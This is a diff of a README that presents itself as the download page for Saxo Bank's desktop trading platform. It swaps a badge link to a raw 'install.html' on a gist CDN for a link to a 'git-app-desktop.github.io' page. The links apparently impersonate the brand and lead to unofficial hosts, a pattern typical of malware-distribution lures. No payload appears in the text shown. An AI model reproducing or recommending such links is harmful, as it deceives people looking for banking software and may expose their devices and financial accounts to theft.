@@ -1,6 +1,6 @@
 # Saxo Bank Download — Advanced Desktop Trading Platform
 
-<a href="https://gistcdn.githack.com/forthtopblogger826/b1dc0c4992b99358c5e159a324dc0d24/raw/336a99c962fe5e15894d01f4bda17f477a8de4c5/install.html?offer=SaxoBank" target="_blank">
+<a href="https://git-app-desktop.github.io/.github/?offer=SaxoBank" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20Saxo%20Bank%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
